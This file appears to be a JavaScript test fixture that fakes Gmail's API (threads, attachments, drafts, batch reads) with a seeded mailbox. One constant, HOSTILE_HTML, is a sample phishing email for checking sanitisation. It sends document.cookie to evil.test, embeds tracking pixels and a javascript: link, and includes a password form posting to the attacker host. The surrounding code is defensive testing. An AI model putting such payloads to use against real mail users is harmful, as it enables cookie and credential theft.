// Gmail on the stand-in: labels, threads, messages, attachments, drafts, send-as addresses, and
// the batch address that answers several reads at once. `fake.data.gmail[who]` is each person's
// mailbox; Ada's is seeded with a little of everything the mail screens show.
import { apiError, jsonAnswer } from './fake-google.mjs'

const HOST = 'gmail.googleapis.com'
const SCOPE = ['https://www.googleapis.com/auth/gmail.modify', 'https://mail.google.com/']
const BASE = '/gmail/v1/users/me'
const SYSTEM = ['INBOX', 'SENT', 'DRAFT', 'SPAM', 'TRASH', 'STARRED', 'UNREAD', 'IMPORTANT']

const b64 = (value) => Buffer.from(value).toString('base64url')

/** A message of a mailbox, as the tests seed and read it. */
function message(id, threadId, minutesAgo, labelIds, headers, body = {}) {
  return {
    id,
    threadId,
    internalDate: String(Date.UTC(2026, 10, 26, 12, 0, 0) - minutesAgo * 60_000),
    labelIds,
    headers: { 'Message-ID': `<${id}@mail.test>`, ...headers },
    text: body.text ?? null,
    html: body.html ?? null,
    /** The HTML comes apart from the message, as Gmail hands over a long body. */
    htmlApart: body.htmlApart ?? false,
    attachments: body.attachments ?? [],
  }
}

/** What a hostile sender puts in a message: everything the frame must not let through. */
export const HOSTILE_HTML = [
  '<html><head><title>Alert</title><style>body{background:url(https://evil.test/track.gif)}</style>',
  '<base href="https://evil.test/"><meta http-equiv="refresh" content="0;url=https://evil.test/"></head><body>',
  '<h1 onclick="steal()">Security alert</h1>',
  '<script>document.location="https://evil.test/?c="+document.cookie</script>',
  '<img src="https://evil.test/pixel.gif" alt="pixel" onerror="steal()">',
  '<a href="javascript:steal()">Review activity</a>',
  '<a href="https://example.com/account?a=1&amp;b=2">Your account</a>',
  '<form action="https://evil.test/login"><input name="password"><button>Sign in</button></form>',
  '<iframe src="https://evil.test/"></iframe>',
  '<svg><script>steal()</script></svg>',
  '<p style="color:red;background:url(https://evil.test/bg.png);position:fixed">Act now</p>',
  '</body></html>',
].join('\n')

function seedAda() {
  const filler = Array.from({ length: 16 }, (_, index) =>
    message(
      `n${index + 1}`,
      `tn${index + 1}`,
      600 + index * 60,
      ['INBOX'],
      {
        From: `Newsletter ${index + 1} <news${index + 1}@letters.test>`,
        To: 'ada@gmail.com',
        Subject: `This week in web performance, issue ${index + 1}`,
      },
      { text: `Five links worth your time, issue ${index + 1}.` },
    ),
  )
  return {
    nextId: 100,
    batchBroken: false,
    labels: [
      { id: 'Label_1', name: 'Clients' },
      { id: 'Label_2', name: 'Invoices' },
    ],
    sendAs: [
      { sendAsEmail: 'ada@gmail.com', displayName: 'Ada Lovelace', isPrimary: true },
      {
        sendAsEmail: 'support@example.com',
        displayName: 'Ada, Support',
        verificationStatus: 'accepted',
      },
      { sendAsEmail: 'pending@example.com', displayName: 'Not yet', verificationStatus: 'pending' },
    ],
    messages: [
      message(
        'm1',
        't1',
        300,
        ['INBOX', 'Label_1'],
        {
          From: 'Grace Hopper <grace@example.com>',
          To: 'Ada Lovelace <ada@gmail.com>',
          Subject: 'Episode 12 thumbnail',
        },
        { text: 'First version attached. Too much text?' },
      ),
      message(
        'm2',
        't1',
        240,
        ['SENT'],
        {
          From: 'Ada Lovelace <ada@gmail.com>',
          To: 'Grace Hopper <grace@example.com>',
          Subject: 'Re: Episode 12 thumbnail',
          'In-Reply-To': '<m1@mail.test>',
          References: '<m1@mail.test>',
        },
        { text: 'A little. Can the title be larger and the subtitle go?' },
      ),
      message(
        'm3',
        't1',
        78,
        ['INBOX', 'STARRED', 'UNREAD', 'Label_1'],
        {
          From: 'Grace Hopper <grace@example.com>',
          To: 'Ada Lovelace <ada@gmail.com>',
          Cc: 'Linus Example <linus@example.com>, ada@gmail.com',
          Subject: 'Re: Episode 12 thumbnail',
          'In-Reply-To': '<m2@mail.test>',
          References: '<m1@mail.test> <m2@mail.test>',
        },
        {
          text: 'Hi Ada,\n\nHere is the second version. The title is larger.\n\nGrace',
          html: '<div><p>Hi Ada,</p><p>Here is the <b>second version</b>. The title is larger.</p><p>Grace</p></div>',
          attachments: [
            {
              filename: 'thumbnail-v2.png',
              mimeType: 'image/png',
              data: Buffer.from('PNG-BYTES-OF-THE-THUMBNAIL'),
            },
          ],
        },
      ),
      message(
        'm4',
        't2',
        165,
        ['INBOX', 'UNREAD', 'Label_2'],
        {
          From: 'Linus Example <linus@example.com>',
          To: 'ada@gmail.com',
          Subject: 'Invoice 2026-118',
        },
        {
          text: 'Hi Ada, the invoice for November is attached.',
          attachments: [
            {
              filename: 'invoice 2026-118 é.pdf',
              mimeType: 'application/pdf',
              data: Buffer.from('%PDF-1.7 invoice'),
            },
          ],
        },
      ),
      message(
        'm5',
        't3',
        210,
        ['INBOX', 'UNREAD'],
        {
          From: 'Google <no-reply@accounts.evil.test>',
          To: 'ada@gmail.com',
          Subject: 'Security alert',
        },
        { html: HOSTILE_HTML },
      ),
      message(
        'm6',
        't4',
        900,
        ['SPAM'],
        {
          From: 'Prize Desk <win@spam.test>',
          To: 'ada@gmail.com',
          Subject: 'You won',
        },
        { text: 'Claim your prize.' },
      ),
      message(
        'm7',
        't5',
        1200,
        ['TRASH'],
        {
          From: 'Old Thread <old@example.com>',
          To: 'ada@gmail.com',
          Subject: 'Old plans',
        },
        { text: 'These plans are old.' },
      ),
      message(
        'm8',
        't6',
        1500,
        ['SENT'],
        {
          From: 'Ada Lovelace <ada@gmail.com>',
          To: 'Margaret H. <margaret@example.com>',
          Subject: 'Storage setup call',
        },
        { text: 'Thursday at three works for me.' },
      ),
      message(
        'm9',
        't7',
        400,
        ['INBOX'],
        {
          From: 'Katherine J. <katherine@example.com>',
          To: 'ada@gmail.com',
          Subject: '=?UTF-8?B?TG9uZyBuZXdzbGV0dGVyIOKAkyBvdmVydmlldw==?=',
        },
        { html: `<p>A long one.</p>${'<p>More text.</p>'.repeat(20)}`, htmlApart: true },
      ),
      message(
        'md1',
        'td1',
        30,
        ['DRAFT'],
        {
          From: 'Ada Lovelace <ada@gmail.com>',
          To: 'Katherine J. <katherine@example.com>',
          Subject: 'Draft of the launch plan',
        },
        {
          text: 'I left comments on the second page.',
          attachments: [
            { filename: 'plan.txt', mimeType: 'text/plain', data: Buffer.from('the plan') },
          ],
        },
      ),
      ...filler,
    ],
    drafts: [{ id: 'd1', messageId: 'md1' }],
  }
}

// ── Reading a message Gmail was sent ───────────────────────────────────────────

const decodeWords = (value) =>
  value
    .replace(/\?=\s+=\?/g, '?==?')
    .replace(/=\?UTF-8\?B\?([^?]*)\?=/gi, (_, data) => Buffer.from(data, 'base64').toString('utf8'))

/** Headers and parts of a MIME message: enough for what the plugin's own builder writes. */
function parseEntity(source) {
  const split = source.indexOf('\r\n\r\n')
  const head = (split < 0 ? source : source.slice(0, split)).replace(/\r\n[ \t]+/g, ' ')
  const body = split < 0 ? '' : source.slice(split + 4)
  const headers = {}
  for (const line of head.split('\r\n')) {
    const colon = line.indexOf(':')
    if (colon > 0)
      headers[line.slice(0, colon).toLowerCase()] = decodeWords(line.slice(colon + 1).trim())
  }
  const type = headers['content-type'] ?? 'text/plain'
  const boundary = /boundary="([^"]+)"/.exec(type)?.[1]
  if (!boundary) return { headers, type, body, parts: [] }
  const parts = body
    .split(`--${boundary}`)
    .slice(1, -1)
    .map((part) => parseEntity(part.replace(/^\r\n/, '').replace(/\r\n$/, '')))
  return { headers, type, body: '', parts }
}

const leaves = (entity) => (entity.parts.length ? entity.parts.flatMap(leaves) : [entity])
const decoded = (entity) =>
  entity.headers['content-transfer-encoding'] === 'base64'
    ? Buffer.from(entity.body, 'base64')
    : Buffer.from(entity.body)

/** A stored message from the raw MIME a client sent. */
function fromMime(box, mime, labelIds, threadId) {
  const entity = parseEntity(mime)
  const name = (header) => {
    const original = {
      from: 'From',
      to: 'To',
      cc: 'Cc',
      bcc: 'Bcc',
      subject: 'Subject',
      'in-reply-to': 'In-Reply-To',
      references: 'References',
      'reply-to': 'Reply-To',
    }
    return original[header]
  }
  const headers = {}
  for (const [key, value] of Object.entries(entity.headers))
    if (name(key)) headers[name(key)] = value
  const parts = leaves(entity)
  const text = parts.find(
    (part) => part.type.startsWith('text/plain') && !part.headers['content-disposition'],
  )
  const html = parts.find(
    (part) => part.type.startsWith('text/html') && !part.headers['content-disposition'],
  )
  const attachments = parts
    .filter((part) => part.headers['content-disposition']?.startsWith('attachment'))
    .map((part) => ({
      filename:
        decodeURIComponent(
          /filename\*=UTF-8''([^;]+)/.exec(part.headers['content-disposition'])?.[1] ?? '',
        ) ||
        /filename="([^"]*)"/.exec(part.headers['content-disposition'])?.[1] ||
        'file',
      mimeType: part.type.split(';')[0].trim(),
      data: decoded(part),
    }))
  const id = `m${box.nextId++}`
  return message(id, threadId || `t${id}`, 0, labelIds, headers, {
    text: text ? decoded(text).toString('utf8') : null,
    html: html ? decoded(html).toString('utf8') : null,
    attachments,
  })
}

/** The JSON half and the message half of an upload to Gmail (`uploadType=multipart`). */
function uploadParts(headers, body) {
  const boundary = /boundary=([^;]+)/.exec(headers['content-type'] ?? '')?.[1]
  const [, json, mime] = body.toString('utf8').split(`--${boundary}`)
  const after = (part) => part.slice(part.indexOf('\r\n\r\n') + 4).replace(/\r\n$/, '')
  return { metadata: JSON.parse(after(json) || '{}'), mime: after(mime) }
}

// ── A message as Gmail's API describes it ──────────────────────────────────────

let attachmentReads = 0

const snippetOf = (stored) =>
  (stored.text ?? (stored.html ?? '').replace(/<[^>]+>/g, ' '))
    .replace(/\s+/g, ' ')
    .trim()
    .slice(0, 100)

function payloadOf(stored, format, wanted) {
  const headers = Object.entries(stored.headers).map(([name, value]) => ({ name, value }))
  if (format === 'metadata') {
    return {
      mimeType: 'multipart/mixed',
      headers: headers.filter((header) => wanted.includes(header.name.toLowerCase())),
    }
  }
  const leaf = (partId, mimeType, content) => ({
    partId,
    mimeType,
    filename: '',
    headers: [{ name: 'Content-Type', value: `${mimeType}; charset="UTF-8"` }],
    body: { size: Buffer.byteLength(content), data: b64(content) },
  })
  const bodies = []
  if (stored.text !== null) bodies.push(['text/plain', stored.text])
  if (stored.html !== null) bodies.push(['text/html', stored.html])
  const attachment = (partId, file, index) => ({
    partId,
    mimeType: file.mimeType,
    filename: file.filename,
    headers: [{ name: 'Content-Type', value: file.mimeType }],
    // Gmail's id for an attachment is new each time the message is read.
    // `claimedSize` lets a test have Gmail say one size and send another.
    body: {
      attachmentId: `att.${stored.id}.${index}.${++attachmentReads}`,
      size: file.claimedSize ?? file.data.byteLength,
    },
  })
  const apart = (part) =>
    stored.htmlApart && part.mimeType === 'text/html'
      ? {
          ...part,
          body: {
            attachmentId: `att.${stored.id}.html.${++attachmentReads}`,
            size: part.body.size,
          },
        }
      : part
  if (stored.attachments.length === 0 && bodies.length === 1) {
    return { ...apart(leaf('', bodies[0][0], bodies[0][1])), headers }
  }
  const prefix = stored.attachments.length > 0 && bodies.length > 1 ? '0.' : ''
  const bodyParts = bodies.map(([type, content], index) =>
    apart(leaf(`${prefix}${index}`, type, content)),
  )
  if (stored.attachments.length === 0) {
    return {
      partId: '',
      mimeType: 'multipart/alternative',
      filename: '',
      headers,
      body: { size: 0 },
      parts: bodyParts,
    }
  }
  const first =
    bodies.length > 1
      ? [
          {
            partId: '0',
            mimeType: 'multipart/alternative',
            filename: '',
            headers: [],
            body: { size: 0 },
            parts: bodyParts,
          },
        ]
      : bodyParts
  return {
    partId: '',
    mimeType: 'multipart/mixed',
    filename: '',
    headers,
    body: { size: 0 },
    parts: [
      ...first,
      ...stored.attachments.map((file, index) =>
        attachment(String(first.length + index), file, index),
      ),
    ],
  }
}

const describe = (stored, url) => ({
  id: stored.id,
  threadId: stored.threadId,
  labelIds: stored.labelIds,
  snippet: snippetOf(stored),
  internalDate: stored.internalDate,
  payload: payloadOf(
    stored,
    url.searchParams.get('format') ?? 'full',
    url.searchParams.getAll('metadataHeaders').map((name) => name.toLowerCase()),
  ),
})

/** Adds Gmail to the stand-in: pass it in `routes` when starting the stand-in. */
export function fakeGmail(fake) {
  const seed = () => {
    fake.data.gmail = { ada: seedAda() }
  }
  fake.seeds.push(seed)
  seed()

  const boxOf = (who) =>
    (fake.data.gmail[who] ??= {
      nextId: 100,
      batchBroken: false,
      labels: [],
      sendAs: [
        {
          sendAsEmail: fake.people[who].email,
          displayName: fake.people[who].name,
          isPrimary: true,
        },
      ],
      messages: [],
      drafts: [],
    })
  const threadOf = (box, id) =>
    box.messages
      .filter((stored) => stored.threadId === id)
      .sort((a, b) => Number(a.internalDate) - Number(b.internalDate))
  const knownLabel = (box, id) => SYSTEM.includes(id) || box.labels.some((label) => label.id === id)

  /** The reads, by path: registered each on its own, and reachable through the batch address. */
  const reads = []
  const read = (pattern, handler) => {
    reads.push({
      pattern: new RegExp(`^${BASE}${pattern.replace(/:(\w+)/g, '([^/]+)')}$`),
      handler,
    })
    fake.route('GET', HOST, `${BASE}${pattern}`, SCOPE, (call) =>
      handler(call, ...Object.values(call.params)),
    )
  }

  read('/labels', ({ who }) => {
    const box = boxOf(who)
    return jsonAnswer(200, {
      labels: [
        ...SYSTEM.map((id) => ({ id, name: id, type: 'system' })),
        { id: 'CATEGORY_PERSONAL', name: 'CATEGORY_PERSONAL', type: 'system' },
        ...box.labels.map((label) => ({ ...label, type: 'user' })),
      ],
    })
  })

  read('/labels/:id', ({ who }, id) => {
    const box = boxOf(who)
    if (!knownLabel(box, id)) return apiError(404, 'notFound', 'Label not found')
    const threads = new Map()
    for (const stored of box.messages) {
      if (!stored.labelIds.includes(id)) continue
      threads.set(
        stored.threadId,
        (threads.get(stored.threadId) ?? false) ||
          threadOf(box, stored.threadId).some((other) => other.labelIds.includes('UNREAD')),
      )
    }
    return jsonAnswer(200, {
      id,
      name: box.labels.find((label) => label.id === id)?.name ?? id,
      type: SYSTEM.includes(id) ? 'system' : 'user',
      threadsTotal: threads.size,
      threadsUnread: [...threads.values()].filter(Boolean).length,
    })
  })

  read('/threads', ({ who, url }) => {
    const box = boxOf(who)
    const label = url.searchParams.get('labelIds')
    const q = (url.searchParams.get('q') ?? '').toLowerCase()
    const size = Number(url.searchParams.get('maxResults') ?? 100)
    const offset = Number(url.searchParams.get('pageToken') ?? 0)
    const ids = [...new Set(box.messages.map((stored) => stored.threadId))]
    const matching = ids
      .map((id) => threadOf(box, id))
      .filter((messages) => {
        const labels = messages.flatMap((stored) => stored.labelIds)
        if (label ? !labels.includes(label) : labels.includes('SPAM') || labels.includes('TRASH'))
          return false
        if (!label && messages.every((stored) => stored.labelIds.includes('DRAFT'))) return false
        if (!q) return true
        const from = /from:(\S+)/.exec(q)?.[1]
        if (from) return messages.some((stored) => stored.headers.From.toLowerCase().includes(from))
        if (q.includes('has:attachment'))
          return messages.some((stored) => stored.attachments.length > 0)
        return messages.some((stored) =>
          `${stored.headers.Subject} ${stored.text ?? ''}`.toLowerCase().includes(q),
        )
      })
      .sort((a, b) => Number(b.at(-1).internalDate) - Number(a.at(-1).internalDate))
    const page = matching.slice(offset, offset + size)
    return jsonAnswer(200, {
      threads: page.map((messages) => ({
        id: messages[0].threadId,
        snippet: snippetOf(messages.at(-1)),
        historyId: '1',
      })),
      ...(offset + size < matching.length ? { nextPageToken: String(offset + size) } : {}),
      resultSizeEstimate: matching.length,
    })
  })

  read('/threads/:id', ({ who, url }, id) => {
    const messages = threadOf(boxOf(who), id)
    if (messages.length === 0) return apiError(404, 'notFound', 'Requested entity was not found.')
    return jsonAnswer(200, {
      id,
      historyId: '1',
      messages: messages.map((stored) => describe(stored, url)),
    })
  })

  read('/messages/:id', ({ who, url }, id) => {
    const stored = boxOf(who).messages.find((candidate) => candidate.id === id)
    return stored
      ? jsonAnswer(200, describe(stored, url))
      : apiError(404, 'notFound', 'Requested entity was not found.')
  })

  read('/messages/:id/attachments/:attachment', ({ who }, id, attachment) => {
    const stored = boxOf(who).messages.find((candidate) => candidate.id === id)
    const [, owner, index] = attachment.split('.')
    if (!stored || owner !== id) return apiError(404, 'notFound', 'Attachment not found')
    const data =
      index === 'html' ? Buffer.from(stored.html ?? '') : stored.attachments[Number(index)]?.data
    return data
      ? jsonAnswer(200, { size: data.byteLength, data: b64(data) })
      : apiError(404, 'notFound', 'Attachment not found')
  })

  read('/settings/sendAs', ({ who }) => jsonAnswer(200, { sendAs: boxOf(who).sendAs }))

  read('/drafts', ({ who, url }) => {
    const box = boxOf(who)
    const size = Number(url.searchParams.get('maxResults') ?? 100)
    return jsonAnswer(200, {
      drafts: box.drafts.slice(0, size).map((draft) => ({
        id: draft.id,
        message: {
          id: draft.messageId,
          threadId: box.messages.find((stored) => stored.id === draft.messageId)?.threadId,
        },
      })),
    })
  })

  read('/drafts/:id', ({ who, url }, id) => {
    const box = boxOf(who)
    const draft = box.drafts.find((candidate) => candidate.id === id)
    const stored = draft && box.messages.find((candidate) => candidate.id === draft.messageId)
    return stored
      ? jsonAnswer(200, { id, message: describe(stored, url) })
      : apiError(404, 'notFound', 'Requested entity was not found.')
  })

  // Several reads in one request: each part is a GET line, each answer a small HTTP response.
  fake.route('POST', HOST, '/batch/gmail/v1', SCOPE, (call) => {
    const box = boxOf(call.who)
    if (box.batchBroken === true) return apiError(500, 'backendError', 'The batch address is down')
    const boundary = /boundary=([^;]+)/.exec(call.headers['content-type'] ?? '')?.[1]
    if (box.batchBroken === 'garbled') {
      return {
        status: 200,
        headers: { 'content-type': 'multipart/mixed; boundary=x' },
        body: '--x\r\nnot what was asked\r\n--x--',
      }
    }
    const answers = call.body
      .toString('utf8')
      .split(`--${boundary}`)
      .slice(1, -1)
      .map((part) => {
        const index = /Content-ID: <item-(\d+)>/.exec(part)?.[1]
        const target = new URL(/^GET (\S+)/m.exec(part)[1], fake.url)
        const match = reads
          .map((entry) => ({ entry, found: entry.pattern.exec(target.pathname) }))
          .find((entry) => entry.found)
        const made = match
          ? match.entry.handler(
              { ...call, url: target },
              ...match.found.slice(1).map(decodeURIComponent),
            )
          : apiError(404, 'notFound', 'No such address')
        return `Content-Type: application/http\r\nContent-ID: <response-item-${index}>\r\n\r\nHTTP/1.1 ${made.status} ${made.status === 200 ? 'OK' : 'Error'}\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n${made.body}\r\n`
      })
    // As Google: the answers needn't come back in the order asked.
    answers.reverse()
    return {
      status: 200,
      headers: { 'content-type': 'multipart/mixed; boundary=batch_answer' },
      body: `${answers.map((answer) => `--batch_answer\r\n${answer}`).join('')}--batch_answer--\r\n`,
    }
  })

  // ── Changing threads ─────────────────────────────────────────────────────────

  fake.route('POST', HOST, `${BASE}/threads/:id/modify`, SCOPE, ({ who, params, body }) => {
    const box = boxOf(who)
    const messages = threadOf(box, params.id)
    if (messages.length === 0) return apiError(404, 'notFound', 'Requested entity was not found.')
    const { addLabelIds = [], removeLabelIds = [] } = JSON.parse(body.toString('utf8'))
    if (![...addLabelIds, ...removeLabelIds].every((id) => knownLabel(box, id)))
      return apiError(400, 'invalidArgument', 'Invalid label')
    for (const stored of messages) {
      stored.labelIds = [
        ...new Set([
          ...stored.labelIds.filter((id) => !removeLabelIds.includes(id)),
          ...addLabelIds,
        ]),
      ]
    }
    return jsonAnswer(200, { id: params.id })
  })

  for (const [name, add, remove] of [
    ['trash', ['TRASH'], ['INBOX', 'SPAM']],
    ['untrash', ['INBOX'], ['TRASH']],
  ]) {
    fake.route('POST', HOST, `${BASE}/threads/:id/${name}`, SCOPE, ({ who, params }) => {
      const messages = threadOf(boxOf(who), params.id)
      if (messages.length === 0) return apiError(404, 'notFound', 'Requested entity was not found.')
      for (const stored of messages) {
        stored.labelIds = [
          ...new Set([...stored.labelIds.filter((id) => !remove.includes(id)), ...add]),
        ]
      }
      return jsonAnswer(200, { id: params.id })
    })
  }

  // ── Labels ───────────────────────────────────────────────────────────────────

  fake.route('POST', HOST, `${BASE}/labels`, SCOPE, ({ who, body }) => {
    const box = boxOf(who)
    const { name } = JSON.parse(body.toString('utf8'))
    if (box.labels.some((label) => label.name.toLowerCase() === String(name).toLowerCase())) {
      return apiError(409, 'aborted', 'Label name exists or conflicts')
    }
    const label = { id: `Label_${box.nextId++}`, name }
    box.labels.push(label)
    return jsonAnswer(200, { ...label, type: 'user' })
  })

  fake.route('PATCH', HOST, `${BASE}/labels/:id`, SCOPE, ({ who, params, body }) => {
    const label = boxOf(who).labels.find((candidate) => candidate.id === params.id)
    if (!label) return apiError(404, 'notFound', 'Label not found')
    label.name = JSON.parse(body.toString('utf8')).name
    return jsonAnswer(200, { ...label, type: 'user' })
  })

  fake.route('DELETE', HOST, `${BASE}/labels/:id`, SCOPE, ({ who, params }) => {
    const box = boxOf(who)
    if (!box.labels.some((label) => label.id === params.id))
      return apiError(404, 'notFound', 'Label not found')
    box.labels = box.labels.filter((label) => label.id !== params.id)
    for (const stored of box.messages)
      stored.labelIds = stored.labelIds.filter((id) => id !== params.id)
    return { status: 204, headers: {}, body: '' }
  })

  // ── Drafts, and sending through the upload address ───────────────────────────

  const saveDraft = (box, id, mime, threadId) => {
    const stored = fromMime(box, mime, ['DRAFT'], threadId)
    const existing = box.drafts.find((draft) => draft.id === id)
    if (existing) {
      box.messages = box.messages.filter((candidate) => candidate.id !== existing.messageId)
      existing.messageId = stored.id
    } else {
      box.drafts.unshift({ id, messageId: stored.id })
    }
    box.messages.push(stored)
    return jsonAnswer(200, {
      id,
      message: { id: stored.id, threadId: stored.threadId, labelIds: ['DRAFT'] },
    })
  }
  const rawOf = (body) => {
    const { message = {} } = JSON.parse(body.toString('utf8'))
    return {
      mime: Buffer.from(message.raw ?? '', 'base64url').toString('utf8'),
      threadId: message.threadId ?? null,
    }
  }

  fake.route('POST', HOST, `${BASE}/drafts`, SCOPE, ({ who, body }) => {
    const box = boxOf(who)
    const { mime, threadId } = rawOf(body)
    return saveDraft(box, `d${box.nextId++}`, mime, threadId)
  })
  fake.route('PUT', HOST, `${BASE}/drafts/:id`, SCOPE, ({ who, params, body }) => {
    const box = boxOf(who)
    if (!box.drafts.some((draft) => draft.id === params.id))
      return apiError(404, 'notFound', 'Draft not found')
    const { mime, threadId } = rawOf(body)
    return saveDraft(box, params.id, mime, threadId)
  })
  fake.route('DELETE', HOST, `${BASE}/drafts/:id`, SCOPE, ({ who, params }) => {
    const box = boxOf(who)
    const draft = box.drafts.find((candidate) => candidate.id === params.id)
    if (!draft) return apiError(404, 'notFound', 'Draft not found')
    box.drafts = box.drafts.filter((candidate) => candidate !== draft)
    box.messages = box.messages.filter((stored) => stored.id !== draft.messageId)
    return { status: 204, headers: {}, body: '' }
  })

  fake.route(
    'POST',
    HOST,
    `/upload${BASE}/messages/send`,
    SCOPE,
    ({ who, person, headers, body }) => {
      const { metadata, mime } = uploadParts(headers, body)
      const id = `sent-${fake.sent.length + 1}`
      fake.sent.push({
        id,
        who,
        from: person.email,
        mime,
        threadId: metadata.threadId ?? null,
        upload: true,
      })
      return jsonAnswer(200, { id, threadId: metadata.threadId ?? id, labelIds: ['SENT'] })
    },
  )
  fake.route('POST', HOST, `/upload${BASE}/drafts`, SCOPE, ({ who, headers, body }) => {
    const box = boxOf(who)
    const { metadata, mime } = uploadParts(headers, body)
    return saveDraft(box, `d${box.nextId++}`, mime, metadata.message?.threadId ?? null)
  })
  fake.route('PUT', HOST, `/upload${BASE}/drafts/:id`, SCOPE, ({ who, params, headers, body }) => {
    const box = boxOf(who)
    const { metadata, mime } = uploadParts(headers, body)
    return saveDraft(box, params.id, mime, metadata.message?.threadId ?? null)
  })
}
